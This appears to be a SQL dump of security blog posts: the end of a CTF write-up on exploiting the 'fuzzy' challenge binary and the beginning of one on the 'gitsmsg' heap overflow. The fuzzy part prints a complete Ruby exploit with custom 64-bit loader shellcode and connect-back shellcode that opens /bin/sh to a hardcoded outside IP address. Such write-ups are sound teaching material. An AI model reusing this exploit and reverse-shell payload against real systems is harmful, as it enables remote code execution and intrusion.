executable. I actually made a struct in IDA that had all the functions listed with their offsets from global_f, which made it easy to see what was being called later.\nThe functions themselves pointed to what looks like encrypted/compressed code:\n\r\n.data:006034E0 isSorted        db 0AAh, 0B7h, 76h, 1Ah, 0B7h, 7Eh, 13h, 8Fh, 0FEh, 2 dup(0FFh)\r\n.data:006034E0                                         ; DATA XREF: initFunctions+9Eo\r\n.data:006034E0                 db 0B7h, 76h, 42h, 67h, 1, 2 dup(0), 9Bh, 0B7h, 74h, 0FBh\r\n.data:006034E0                 db 0DAh, 0D7h, 3 dup(0FFh), 0B7h, 76h, 0BAh, 7, 0CEh, 3Fh\r\n.data:006034E0                 db 0B7h, 74h, 7Ah, 67h, 1, 2 dup(0), 74h, 0BFh, 0B7h, 76h\r\n.data:006034E0                 db 7Ah, 4Fh, 1, 2 dup(0), 0B7h, 74h, 7Ah, 67h, 1, 2 dup(0\r\n...\r\n\nSo, almost every function is obscured in some way. I can work with this!\nIn the handleConnection() function, the only call after initFunctions() is:\n\r\n.text:004014DF                 mov     rax, qword ptr cs:global_f+20h ; rax = callFunction\r\n.text:004014E6                 mov     rdx, qword ptr cs:global_f+68h ; rdx = intro\r\n.text:004014ED                 lea     rcx, [rbp+var_4]\r\n.text:004014F1                 mov     rsi, rcx        ; socket\r\n.text:004014F4                 mov     rdi, rdx        ; function\r\n.text:004014F7                 call    rax             ; callFunction\r\n\nLet\'s have a look at callFunction() (I\'ll shorten this to just the super important stuff, grab the file from github if you want a complete listing):\n\r\n.text:004015BB                 mov     edx, 7          ; prot\r\n.text:004015C0                 mov     esi, 514h       ; len\r\n.text:004015CA                 call    _mmap           ; Allocate executable memory\r\n.text:004015DB                 mov     edx, 514h       ; n\r\n.text:004015E0                 mov     rsi, rcx        ; src = the encrypted memory\r\n.text:004015E3                 mov     rdi, rax        ; dest = the allocated memory\r\n.text:004015E6                 call    _memcpy\r\n.text:004015EF                 mov     rdi, rax        ; data = allocated memory\r\n.text:004015F2                 call    decryptFunction\r\n.text:0040160C                 call    rdx             ; the allocated memory\r\n.text:0040161A                 mov     rdi, rax        ; the alocated memory\r\n.text:0040161D                 call    _munmap\r\n.text:00401626                 retn\r\n\nBasically, allocate 0x514 bytes, copy the encrypted code into it, decrypt it, run it, unmap it.\nThe last step is to look at decryptFunction() - once again, I\'m going to leave out unimportant lines:\n\r\n.text:0040151A loop_top:                               ; CODE XREF: decryptFunction+90j\r\n.text:00401534                 movzx   edx, byte ptr [rdx] ; edx = current character\r\n.text:00401537                 not     edx             ; edx = current character inverted\r\n.text:00401539                 mov     [rax], dl       ; invert the current character\r\n.text:00401583                 movzx   eax, byte ptr [rax] ; eax -> current byte\r\n.text:00401586                 cmp     al, 0C3h        ; Stop if we reach a \'ret\'\r\n.text:00401588                 jnz     short loop_bottom\r\n.text:0040158A                 jmp     short done\r\n.text:0040158C ; ---------------------------------------------------------------------------\r\n.text:0040158C\r\n.text:0040158C loop_bottom:                            ; CODE XREF: decryptFunction+6Ej\r\n.text:0040158C                                         ; decryptFunction+74j ...\r\n.text:0040158C                 add     [rbp+counter], 1\r\n.text:00401590                 jmp     short loop_top\r\n.text:00401592 ; ---------------------------------------------------------------------------\r\n.text:00401592\r\n.text:00401592 done:                                   ; CODE XREF: decryptFunction+8Aj\r\n.text:00401592                 mov     eax, [rbp+counter]\r\n.text:00401595                 add     eax, 1\r\n.text:00401598                 leave\r\n.text:00401599                 retn\r\n\nEffectively, this inverts every character until it reaches a return (0xc3). Essentially XORing with 0xFF. One thing I don\'t show here is that it won\'t end until after a sequence of five NOPs are found (the code was a little complicated, and I didn\'t want to get lost in the details).\nTo summarize this section, there is a global table that holds pointers to functions that are encrypted by inverting all bits. The table is initialized in initFunctions(), and the functions are accessed using callFunction(). When callFunction() is called, the function is decrypted into some freshly allocated memory, run, then the memory is freed. So if we can get our own encrypted code into the right place......\nDecrypting\nTo make reversing easier, I wrote a quick ruby script that will decrypt the functions in place:\n\r\nfuzzy = \"\"\r\nFile.open(\"fuzzy\", \"r\") do |f|\r\n  fuzzy = f.read(33183)\r\nend\r\n\r\nputs(fuzzy.length)\r\n\r\nstart = fuzzy.index(\"\\xAA\\xB7\\x76\\x1A\\xB7\\x7C\\x13\\xDF\")\r\nputs(\"start = %x\" % start)\r\n\r\nstart.upto(start + 0x6041E0 - 0x602160 - 1) do |i|\r\n  fuzzy[i] = (fuzzy[i].ord ^ 0xFF).chr\r\nend\r\n\r\nFile.open(\"fuzzy-decrypted\", \"w\") do |f|\r\n  f.write(fuzzy)\r\nend\r\n\nThe output file is fuzzy-decrypted, which you can find on the github repository. fuzzy-decrypted.i64 contains the majority of my comments.\nThis version of the executable won\'t run, of course, because it tries to decrypt the already-decrypted data. The easy way to fix this would be to remove the single call to \'not\', and everything else would work as expected. I didn\'t think of that at the time, however, and NOPed out the entire decryption portion. Here is a diff I generated with objdump + diff, note that the syntax will be slightly different than IDA:\n\r\n 0040159a <callFunction>:\r\n-  40159a:      55                      push   rbp\r\n-  40159b:      48 89 e5                mov    rbp,rsp\r\n-  40159e:      48 83 ec 20             sub    rsp,0x20\r\n-  4015a2:      48 89 7d e8             mov    QWORD PTR [rbp-0x18],rdi\r\n-  4015a6:      48 89 75 e0             mov    QWORD PTR [rbp-0x20],rsi\r\n+  40159a:      48 89 f8                mov    rax,rdi\r\n+  40159d:      bf e0 47 60 00          mov    edi,0x6047e0\r\n+  4015a2:      ff d0                   call   rax\r\n+  4015a4:      c3                      ret\r\n+  4015a5:      90                      nop\r\n+  4015a6:      48 89 7d e8             mov    QWORD PTR [rbp-0x18],rdi\r\n   4015aa:      41 b9 00 00 00 00       mov    r9d,0x0\r\n   4015b0:      41 b8 ff ff ff ff       mov    r8d,0xffffffff\r\n   4015b6:      b9 22 00 00 00          mov    ecx,0x22\r\n\nBasically, remove the actual function lead-in, and replace it with a call directly to the function.\nThe final change I made to the executable was to disable the fork() and alarm() functions, as I discussed in previous posts. In the objdump diff, it looks like this:\n\r\n   401098:      83 7d f4 ff             cmp    DWORD PTR [rbp-0xc],0xffffffff\r\n   40109c:      75 02                   jne    4010a0 <loop+0x3d>\r\n   40109e:      eb 65                   jmp    401105 <loop+0xa2>\r\n-  4010a0:      e8 fb fc ff ff          call   400da0 <fork@plt>\r\n+  4010a0:      48 31 c0                xor    rax,rax\r\n+  4010a3:      90                      nop\r\n+  4010a4:      90                      nop\r\n   4010a5:      89 45 f8                mov    DWORD PTR [rbp-0x8],eax\r\n   4010a8:      83 7d f8 ff             cmp    DWORD PTR [rbp-0x8],0xffffffff\r\n   4010ac:      75 02                   jne    4010b0 <loop+0x4d>\r\n@@ -1220,7 +1222,11 @@\r\n   4010b0:      83 7d f8 00             cmp    DWORD PTR [rbp-0x8],0x0\r\n   4010b4:      75 45                   jne    4010fb <loop+0x98>\r\n   4010b6:      bf 1e 00 00 00          mov    edi,0x1e\r\n-  4010bb:      e8 b0 fb ff ff          call   400c70 <alarm@plt>\r\n+  4010bb:      90                      nop\r\n+  4010bc:      90                      nop\r\n+  4010bd:      90                      nop\r\n+  4010be:      90                      nop\r\n+  4010bf:      90                      nop\r\n   4010c0:      48 8b 05 89 10 20 00    mov    rax,QWORD PTR [rip+0x201089]        # 602150 <USER>\r\n   4010c7:      48 89 c7                mov    rdi,rax\r\n   4010ca:      e8 43 00 00 00          call   401112 <drop_privs_user>\r\n@@ -1584,11 +1590,12 @@\r\n   401599:      c3                      ret\r\n\nThe file, with everything decrypted, can be found under fuzzy-decrypted-fixed on github.\nThe vulnerability\nIn spite of the name - fuzzy - implying that I should probably fuzz, I decided that now that I had the code decrypted I would just look for the vuln manually. I\'m also a contrarian, which these days people are calling \"first world anarchists\". You can\'t tell ME what to do! :)\nAnyway, I decided to reverse the 6 different parsers in a completely random and arbitrary order, based on what looked easiest to understand. As a reminder, here are the possible parsers:\n1) Sentence histogram\n2) Sorted characters (ascending)\n3) Sorted characters (decending)\n4) Sorted ints (ascending)\n5) Sorted ints (decending\n6) global_find numbers in string\nI won\'t go into details of the ones that weren\'t vulnerable; instead, we\'ll look at the first one - Sentence Histrogram. Sentence Histogram calls charHistogram(), which is a rather long function. Essentially, it creates an array of bytes, with one array entry per letter, then loops through the screen and increments the appropriate letter. Something like:\n\r\nchar str[0x80];\r\nfor(i = 0; i < strlen(input); i++) {\r\n  str[input[i]]++;\r\n}\r\n\nHere\'s the actual code, abridged:\n\r\n.data:006031DD                 movzx   eax, byte ptr [rax] ; eax = current_character\r\n.data:006031E0                 movzx   eax, al\r\n.data:006031E3                 movsxd  rdx, eax\r\n.data:006031E6                 movzx   edx, [rbp+rdx+buffer_88_bytes] ; edx = buffer_88_bytes[current_character]\r\n.data:006031EE                 add     edx, 1          ; Increment that index in the 88-byte buffer\r\n.data:006031F1                 cdqe\r\n.data:006031F3                 mov     [rbp+rax+buffer_88_bytes], dl ; <--- VULN\r\n.data:006031FA                 add     [rbp+counter], 1\r\n\nDue to a lack of input validation, if your string contains bytes with a value of at least 0x88 (\'\\x88\'), you can increment not only values in the actual array, but values stored up to 0xFF bytes from the start of the array. Oops! Since the array happens to be on the stack, we can control the entire stack frame, to an extent (unfortunately, we only get a couple hundred characters, so we can\'t, for example, change all bytes of a 64-bit pointer in a meaningful way).\nMadness lies here\nIt\'s been a couple months since I did this, and details for the next few hours of work are fuzzy. I spent a lot of time - probably in the realm of 8 hours or more - trying to figure out what to increment before I noticed this code at the end of charHistrogram():\n\r\ncharHistrogram():006034BE locret_6034BE:                          ; CODE XREF: charHistogram+357j\r\n.data:006034BE                 leave\r\n.data:006034BF                 retn\r\n\nI was in the habit of ignoring \'leave\', and didn\'t really think about it. D\'oh! The \'leave\' instruction pops rbp off the stack (which we control!), then \'ret\', of course, returns to the address on the stack (which we also control). Aha!\nFor an attack, we can modify both the frame pointer - changing how we address local variables - and the return address. Let\'s see how!\nThe attack\nAs I mentioned, I wanted to change the return address. Specifically, I wanted to change it from 0x40160E (the normal return address) to 0x4015AA. The reason I want it to be 0x4015AA is because at that address, this code is found:\n\r\n.text:004015AA                 mov     r9d, 0          ; offset\r\n.text:004015B0                 mov     r8d, 0FFFFFFFFh ; fd\r\n.text:004015B6                 mov     ecx, 22h        ; flags\r\n.text:004015BB                 mov     edx, 7          ; prot\r\n.text:004015C0                 mov     esi, 514h       ; len\r\n.text:004015C5                 mov     edi, 0          ; addr\r\n.text:004015CA                 call    _mmap\r\n.text:004015CF                 mov     [rbp+addr], rax\r\n.text:004015D3                 mov     rcx, [rbp+src]\r\n.text:004015D7                 mov     rax, [rbp+addr]\r\n.text:004015DB                 mov     edx, 514h       ; n\r\n.text:004015E0                 mov     rsi, rcx        ; src\r\n.text:004015E3                 mov     rdi, rax        ; dest\r\n.text:004015E6                 call    _memcpy\r\n.text:004015EB                 mov     rax, [rbp+addr]\r\n.text:004015EF                 mov     rdi, rax\r\n.text:004015F2                 call    decryptFunction\r\n.text:004015F7                 mov     rdx, [rbp+addr]\r\n.text:004015FB                 mov     rax, [rbp+var_20]\r\n.text:004015FF                 mov     rsi, rax\r\n.text:00401602                 mov     edi, offset global_f\r\n.text:00401607                 mov     eax, 0\r\n.text:0040160C                 call    rdx\r\n\nWhich allocates memory, copies code into it (relative to rbp, the frame pointer, which I eventually realized that we control!), decrypts it, and runs it. If we can change the return address to that line, and change rbp just enough that [rbp+src] points to memory we control, we\'re home free!\nNow, to change 0x40160E (the normal return address) to 0x4015AA (the address I want), I had to increment the last byte 0xCA (0xAA - 0xE0) times, and increment the second-last byte once (0x16 - 0x15). I wrote a function called edit_memory() that would essentially do the math for you and increment the proper bytes:\n\r\n 67 def edit_memory(from, to, location)\r\n 68   # Handle each of the 8 bytes, though in practice I think we only needed\r\n 69   # the first two\r\n 70   0.upto(7) do |i|\r\n 71     # Get the before and after values for the current byte\r\n 72     from_i = (from >> (8 * i)) & 0xFF\r\n 73     to_i   = (to   >> (8 * i)) & 0xFF\r\n 74 \r\n 75     # As long as the bytes are different, add the current \'increment\' character\r\n 76     while(from_i != to_i) do\r\n 77       # If we already have the location from the shellcode or something, don\'t\r\n 78       # repeat it\r\n 79       if(!@@used_chars[location+i].nil? && @@used_chars[location+i] > 0)\r\n 80         $stderr.puts(\"Saved a character!\")\r\n 81         @@used_chars[location+i] -= 1\r\n 82       else\r\n 83         my_print((location+i).chr)\r\n 84       end\r\n 85 \r\n 86       # Increment as a byte\r\n 87       from_i = (from_i + 1) & 0xFF\r\n 88     end\r\n 89   end\r\n 90 end\r\n\nOne unfortunate issue that I ran into is that the frame pointer - rbp - is slightly different on my test system and the eventual production system. I ended up writing a small brute forcer that would attempt to run the shellcode \"\\xeb\\xfe\" over and over, with slightly different rbp addresses, until it finally stopped responding, telling me that the infinite loop was successful. That was ugly, but it worked well in the end!\nShellcode\nThat all sounds pretty straight forward, but there was a catch: I decided to point [rbp+src] to the beginning of the character array that\'s fed into the histogram. That may sound good, since I control that memory in full, but the catch is that any character > 0x88 has a chance of modifying an important stack address, which means all shellcode I could find would simply corrupt the stack and crash. D\'oh! It also had to be encoded, since the code is decoded (XORed with 0xFF) before being run, but that\'s easy.\nI spent a lot of time writing code that would basically read a file off the remote filesystem. After a couple hours of carefully crafting shellcode, I finally got it working and realized that the filename wasn\'t the same filename used in the previous two levels. I had no idea which file to read! As a result, I had to write full on exec bind-shell shellcode.\nAfter another couple hours trying to get exec to work without crashing, I gave up that approach, and decided to write a loader instead. A loader can be shorter and simpler, but can run any arbitrary code.\nThree custom shellcode later, considering I had never, up to this point, written 64-bit assembly code, I had both working shellcode and a fairly good understanding of 64-bit shellcoding! :)\nHere\'s what I ended up coming up with:\n\r\n# Encode the custom-written loader code that basically reads from the\r\n# socket into some allocated memory, then runs it.\r\n#\r\n# Trivia: This is my first 64-bit shellcode! :)\r\n#\r\n# This had to be carefully constructed because it would influence the\r\n# eventual histogram, which would modify the stack and therefore break\r\n# everything.\r\nmy_print(encode_shellcode(\r\n\r\n  \"\\xb8\\x09\\x00\\x00\\x00\"     + # mov eax, 0x00000006 (mmap)\r\n  \"\\xbf\\x00\\x00\\x00\\x41\"     + # mov edi, 0x41000000 (addr)\r\n  \"\\xbe\\x00\\x10\\x00\\x00\"     + # mov esi, 0x1000 (size)\r\n  \"\\xba\\x07\\x00\\x00\\x00\"     + # mov rdx, 7 (prot)\r\n  \"\\x41\\xba\\x32\\x00\\x00\\x00\" + # mov r10, 0x32 (flags)\r\n  \"\\x41\\xb8\\x00\\x00\\x00\\x00\" + # mov r8, 0\r\n  \"\\x41\\xb9\\x00\\x00\\x00\\x00\" + # mov r9, 0\r\n  \"\\x0f\\x05\"                 + # syscall - mmap\r\n\r\n  \"\\xbf\\x98\\xf8\\xd0\\xb0\"     + # mov edi, ptr to socket ^ 0xb0b0b0b0\r\n  \"\\x81\\xf7\\xb0\\xb0\\xb0\\xb0\" + # xor edi, 0xb0b0b0b0\r\n  \"\\x48\\x8b\\x3f\"             + # mov edi, [edi]\r\n\r\n  \"\\xb8\\x00\\x00\\x00\\x00\"     + # mov rax, 0\r\n  \"\\xbe\\x00\\x00\\x00\\x41\"     + # mov esi, 0x41000000\r\n  \"\\xba\\x00\\x20\\x00\\x00\"     + # mov edx, 0x2000\r\n  \"\\x0f\\x05\"                 + # syscall - read\r\n  \"\\x56\\xc3\"                 + # push esi / ret\r\n  \"\\xc3\"                     + # ret\r\n\r\n  \"\\xcd\\x03\" # int 3\r\n))\r\n\nBasically, this calls mmap() to allocate a bunch of memory, reads the actual socket descriptor from a global varibale, reads data from the socket into the memory, then jumps to the start of it. Now I can use a bind-shell I found online without worrying about input restrictions!\nThe exploit\nI don\'t think I chose the best possible way to attack this vulnerability. As I mentioned before, it required a small amount of bruteforcing to get offsets on the production server, which isn\'t the cleanest. Here\'s the exploit, in full, with comments. I\'ve already explained the interesting bits:\n\r\n  1 # The base address of the array that overwrites code\r\n  2 # (Note: this can change based on the length that we sent! The rest doesn\'t appear to)\r\n  3 BASE_VULN_ARRAY = 0x7fffffffdf80-0x90\r\n  4 \r\n  5 # The real target and my local target have different desired FP values\r\n  6 IS_REAL_TARGET = 1\r\n  7 \r\n  8 # We want to edit the return address\r\n  9 RETURN_ADDR         = 0x7fffffffdf88  # Where the value we want to edit is\r\n 10 RETURN_OFFSET       = RETURN_ADDR - BASE_VULN_ARRAY\r\n 11 REAL_RETURN_ADDR    = 0x40160E\r\n 12 DESIRED_RETURN_ADDR = 0x4015AA\r\n 13 \r\n 14 # And also edit the frame pointer\r\n 15 FP_ADDR         = 0x7fffffffdf80\r\n 16 FP_OFFSET       = FP_ADDR - BASE_VULN_ARRAY\r\n 17 REAL_FP         = 0x00007fffffffdfb0\r\n 18 DESIRED_FP      = 0x00007fffffffdfe8 + (7 * 8 * IS_REAL_TARGET)\r\n 19 \r\n 20 # This global tracks which characters we use in our shellcode, to avoid\r\n 21 # influence the histogram values for the important offsets\r\n 22 @@used_chars = []\r\n 23 \r\n 24 # Keep track of how many bytes were printed, so we can print padding after\r\n 25 # (and avoid changing the size of the stack)\r\n 26 #\r\n 27 # I added this because I noticed addresses on the stack shifting relative\r\n 28 # to each other, a bit, though that may have been sleep-deprived daftness\r\n 29 @@n = 0\r\n 30 def my_print(str)\r\n 31   print(str)\r\n 32   @@n += str.length\r\n 33 end\r\n 34 \r\n 35 # Code is \'encrypted\' with a simple xor operation\r\n 36 def encode_shellcode(code)\r\n 37   buf = \"\"\r\n 38 \r\n 39   0.upto(code.length-1) do |i|\r\n 40     c = code[i].ord ^ 0xFF;\r\n 41 \r\n 42     # If encoded shellcode contains a newline, it won\'t work, so catch it early\r\n 43     if(c == 0x0a)\r\n 44       $stderr.puts(\"Shellcode has a newline! :(\")\r\n 45       exit\r\n 46     end\r\n 47 \r\n 48     # Increment the histogram for this character\r\n 49     @@used_chars[c] = @@used_chars[c].nil? ? 1 : @@used_chars[c] + 1\r\n 50 \r\n 51     # Append it to the buffer\r\n 52     buf += c.chr\r\n 53   end\r\n 54 \r\n 55   return buf\r\n 56 end\r\n 57 \r\n 58 # This will edit any memory address up to 32 bytes away on the stack. I\r\n 59 # wrote it because I got sick of doing this manually.\r\n 60 #\r\n 61 # Basically, it looks at two variables - the \'from\' is the original, known\r\n 62 # value, and \'to\' is value we want it to be. It modifies each of the\r\n 63 # variables one byte at a time, by incrementing the byte.\r\n 64 #\r\n 65 # Each byte increment is one character in the output, so the more different\r\n 66 # the values are, the bigger the output gets (eventually getting too big)\r\n 67 def edit_memory(from, to, location)\r\n 68   # Handle each of the 8 bytes, though in practice I think we only needed\r\n 69   # the first two\r\n 70   0.upto(7) do |i|\r\n 71     # Get the before and after values for the current byte\r\n 72     from_i = (from >> (8 * i)) & 0xFF\r\n 73     to_i   = (to   >> (8 * i)) & 0xFF\r\n 74 \r\n 75     # As long as the bytes are different, add the current \'increment\' character\r\n 76     while(from_i != to_i) do\r\n 77       # If we already have the location from the shellcode or something, don\'t\r\n 78       # repeat it\r\n 79       if(!@@used_chars[location+i].nil? && @@used_chars[location+i] > 0)\r\n 80         $stderr.puts(\"Saved a character!\")\r\n 81         @@used_chars[location+i] -= 1\r\n 82       else\r\n 83         my_print((location+i).chr)\r\n 84       end\r\n 85 \r\n 86       # Increment as a byte\r\n 87       from_i = (from_i + 1) & 0xFF\r\n 88     end\r\n 89   end\r\n 90 end\r\n 91 \r\n 92 # Choose \'histogram\'\r\n 93 puts(\"1\")\r\n 94 \r\n 95 # The first part gets eaten, I\'m not sure why\r\n 96 my_print(encode_shellcode(\"\\x90\" * 20))\r\n 97 \r\n 98 # Encode the custom-written loader code that basically reads from the\r\n 99 # socket into some allocated memory, then runs it.\r\n100 #\r\n101 # Trivia: This is my first 64-bit shellcode! :)\r\n102 #\r\n103 # This had to be carefully constructed because it would influence the\r\n104 # eventual histogram, which would modify the stack and therefore break\r\n105 # everything.\r\n106 my_print(encode_shellcode(\r\n107 \r\n108   \"\\xb8\\x09\\x00\\x00\\x00\"     + # mov eax, 0x00000006 (mmap)\r\n109   \"\\xbf\\x00\\x00\\x00\\x41\"     + # mov edi, 0x41000000 (addr)\r\n110   \"\\xbe\\x00\\x10\\x00\\x00\"     + # mov esi, 0x1000 (size)\r\n111   \"\\xba\\x07\\x00\\x00\\x00\"     + # mov rdx, 7 (prot)\r\n112   \"\\x41\\xba\\x32\\x00\\x00\\x00\" + # mov r10, 0x32 (flags)\r\n113   \"\\x41\\xb8\\x00\\x00\\x00\\x00\" + # mov r8, 0\r\n114   \"\\x41\\xb9\\x00\\x00\\x00\\x00\" + # mov r9, 0\r\n115   \"\\x0f\\x05\"                 + # syscall - mmap\r\n116 \r\n117   \"\\xbf\\x98\\xf8\\xd0\\xb0\"     + # mov edi, ptr to socket ^ 0xb0b0b0b0\r\n118   \"\\x81\\xf7\\xb0\\xb0\\xb0\\xb0\" + # xor edi, 0xb0b0b0b0\r\n119   \"\\x48\\x8b\\x3f\"             + # mov edi, [edi]\r\n120 \r\n121   \"\\xb8\\x00\\x00\\x00\\x00\"     + # mov rax, 0\r\n122   \"\\xbe\\x00\\x00\\x00\\x41\"     + # mov esi, 0x41000000\r\n123   \"\\xba\\x00\\x20\\x00\\x00\"     + # mov edx, 0x2000\r\n124   \"\\x0f\\x05\"                 + # syscall - read\r\n125   \"\\x56\\xc3\"                 + # push esi / ret\r\n126   \"\\xc3\"                     + # ret\r\n127 \r\n128   \"\\xcd\\x03\" # int 3\r\n129 ))\r\n130 \r\n131 # The \'decryption\' function requires some NOPs (I think 6) followed by a return\r\n132 # to identify the end of an encrypted function\r\n133 my_print(encode_shellcode((\"\\x90\" * 10) + \"\\xc3\"))\r\n134 \r\n135 ## Increment the return address\r\n136 edit_memory(REAL_RETURN_ADDR, DESIRED_RETURN_ADDR, RETURN_OFFSET)\r\n137 edit_memory(REAL_FP, DESIRED_FP, FP_OFFSET)\r\n138 \r\n139 # Pad up to exactly 0x300 bytes\r\n140 while(@@n < 0x300)\r\n141   my_print(encode_shellcode(\"\\x90\"))\r\n142   @@n += 1\r\n143 end\r\n144 \r\n145 # Add the final newline, which triggers the overwrites and stuff\r\n146 puts()\r\n147 \r\n148 # This is standard shellcode I found online and modified a tiny bit\r\n149 #\r\n150 # It\'s what\'s read by the \'loader\'.\r\n151 SCPORT = \"\\x41\\x41\" # 16705 */\r\n152 SCIPADDR = \"\\xce\\xdc\\xc4\\x3b\" # 206.220.196.59 */\r\n153 puts(\"\" +\r\n154   \"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\" +\r\n155   \"\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\" +\r\n156   \"\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\" +\r\n157   \"\\x02\"+SCPORT+\"\\xc7\\x44\\x24\\x04\"+SCIPADDR+\"\\x48\\x89\\xe6\\x6a\\x10\" +\r\n158   \"\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\" +\r\n159   \"\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\" +\r\n160   \"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\" +\r\n161   \"\\x5f\\x6a\\x3b\\x58\\x0f\\x05\\0\\0\\0\\0\")\r\n162 \r\n\nConclusion\nSo, that\'s my months-late writeup of fuzzy! I think I captured most of the details accurately. One thing I haven\'t mentioned is that I ended up finishing it at about 6:30am, a solid 12 hours of working after I started! It certainly shouldn\'t have been that difficult, but I took some long wrong turns. :)', '\'GITS2014\', \'Hacking\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-fuzzy-pwnage-301');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (30, 'Ghost in the Shellcode: gitsmsg (Pwnage 299)', 'Ron Bowes', '2014-1-27', '\"It\'s Saturday night; I have no date, a 2L bottle of Shasta, and my all-rush mix tape. Let\'s rock!\"\n...that\'s what I said before I started gitsmsg. I then entered \"Rush\" into Pandora, and listened to a mix of Rush, Kansas, Queen, Billy Idol, and other 80\'s rock for the entire level. True story.\nAnyway, let\'s get on with it! Not too long ago I posted my writeup for the 100-level \"Pwnage\" challenge from Ghost in the Shellcode. Now, it\'s time to get a little more advanced and talk about the 299-level challenge: gitsmsg. Solved by only 11 teams, this was considerably more challenging.\nAs before, you can obtain the binary, my annotated IDA database, and exploit code on my Github page\n\nOverview\nI\'ll start right out by saying: gits was a huge timesink, for me. It was a Linux-based 32-bit application, which was nice, but the codebase was biiiiig and scary, it took a long time to reverse it, and then possibly even longer to get the exploit working. I\'ll explain the bumps I hit as I go through this.\nThe summary is, it\'s a messaging server. You log in, queue/view/modify/delete messages for other users, send those messages, and read your own. The messages are stored in a heap-based linked list, and one type of message was vulnerable to a heap-based overflow. To make things difficult, the system implemented address-space layout randomization (ASLR) and data execution prevention (DEP), which had to be bypassed, as well as having read-only relocations (RELRO)enabled, which marks its imports as read-only once they\'ve been set up by the dynamic linker.\nSo, a heap overflow on a system with all modern protections. Sounds like a challenge!\nThis time, I\'m not going to spend any time on the assembly or reversing portions, there\'s just too much. I\'ll describe the protocol, the vulnerability, and the exploit. My IDA file—available from the Github link above—is heavily annotated, so feel free to peruse it! And if you\'re going to debug it, make sure you disable fork()/alarm() as I described in my last post!\nThe protocol\nAs I mentioned before, this is a messaging server. It supports eight different payload types, numbered 0x10 to 0x17, which can be used in nine different message types, numbered 0x01 to 0x09. Just for fun, here are my scratch notes I wrote while working on it.\nPayload types\nThe following payloads are defined:\n\n0x10 :: a byte (uint8)\n0x11 :: an integer (uint32)\n0x12 :: a double (uint64)\n0x13 :: an array of bytes (uint8[])\n0x14 :: an array of integers (uint32[])\n0x15 :: an array of doubles (uint64[])\n0x16 :: a static null-terminated string (there are 4 or 5 possible choices, indexed with a byte value)\n\nIt\'s possible that the types I called double might actually be intended as 64-bit integers, but ultimately it doesn\'t matter.\nNo message can be longer than 0x400 bytes, total. Which means an array of doubles can\'t be longer than 0x80 elements (0x80 elements * 8 bytes/element = 0x400 bytes).\nMessage types\nThese payload types can be used in any of the 9 message types:\n\n0x01 :: login :: must be sent initially, also retrieves your messages\n0x02 :: delete_queued_message :: unlinks a message from a linked list\n0x03 :: retrieve_my_messages :: retrieve a list of the queued messages I\'ve sent\n0x04 :: store_message :: saves a message into a linked list of queued messages\n0x05 :: get_stored_message :: retrieves and displays a message from a linked list\n0x06 :: do_weird_math :: loops through the messages and does some kind of math that I didn\'t dig into\n0x07 :: send_queued_messages :: writes all your messages to the filesystem under the recipient\'s username; he\'ll get them when he logs in\n0x08 :: edit_queued_message :: edit a queued message\n0x09 :: quit\n\nMessage struct\nThe messages are all stored in a struct that looks like:\n\n(uint32) unknown\n(uint32) message_type\n(uint32) message-specific payload (see below)\n(uint32) message-specific payload (part 2)\n(char[256]) from_username\n(char[256]) to_username\n(char[240]) filename\n(char[272]) unknown/unused\n(void*) next_message\n\nBasically, a linked list. The most interesting field is \"message-specific payload\", which contains different data depending on the message_type (I\'m guessing it\'s implemented as a union in the original program).\nFor the simple datatypes (byte/int32/double), the message-specific payload is simply the 8-, 32-, or 64-bit value, stored across the pair of message-specific payload values.\nFor the array types (byte array/int32 array/double array), the first message-specific payload value is a 32-bit pointer to some freshly allocated memory, and the second is the length of said memory (this pair will be very important later, when we read/write arbitrary memory!).\nFinally, for the static string type, it\'s a pointer to one of several static strings that are hardcoded into the binary (this value will be useful later when we want to bypass ASLR).\nLater on, there\'s a field I called \'unknown/unused\'; I suspect that it\'s simply designed to make the struct bigger than a single message can possibly be—0x400 bytes—to prevent overwriting the \'next_message\' pointer. But that\'s purely an unvalidated guess, especially since there are easier and better ways to get an arbitrary memory write (as I\'ll explain later).\nThe vulnerability\nI actually found this issue quite by accident. I was implementing the store/get protocol, and I kept getting mysterious SIG_ABRT messages. I plugged in a debugger and found that it was crashing in malloc(). Sweet! Sounds like a heap overflow!\nI narrowed it down by simply adding/removing messages of the different types, until I discovered that message type 0x15—DOUBLE_ARRAY—was the culprit.\nI took a look at the code that saves the double arrays to memory and immediately noticed this:\n\r\n.text:B7FFD897         mov     eax, dword ptr [esp+3Ch+local_length] ; jumptable 000017B1 case 5\r\n.text:B7FFD89B         lea     esi, [eax*8+0]  ; esi = local_length * 8\r\n.text:B7FFD8A2         cmp     esi, 3FFh\r\n.text:B7FFD8A8         mov     [ebp+message.length_for_certain_types], eax\r\n.text:B7FFD8AB         ja      return_send_1005\r\n.text:B7FFD8B1         mov     [esp+3Ch+out_arg_0], eax ; size\r\n.text:B7FFD8B4         call    _malloc         ; XXX - VULN! Allocate the wrong number of bytes - it\'s not multiplying by 8\r\n.text:B7FFD8B9         test    eax, eax\r\n.text:B7FFD8BB         jnz     short receive_esi_bytes_into_eax\r\n.text:B7FFD8BD         lea     esi, [esi+0]\r\n.text:B7FFD8C0         jmp     return_send_1005\r\n\nIt\'s multiplying the array size by 8, but not the malloc\'d size! That means it\'ll always try to copy 8x too much data into the array!\nNow, what can we do with this?\nReading and writing arbitrary memory\nIt\'s important to remember the structure of array-containing messages to understand how to read memory. In particular, this structure:\n\n(uint32) unknown\n(uint32) message_type\n(uint32) message-specific payload (pointer)\n(uint32) message-specific payload (length)\n...\n\nLet\'s say we allocate an array of ten doubles using the following code (you can find these functions defined in my exploit code on Github):\n\r\n 1 s 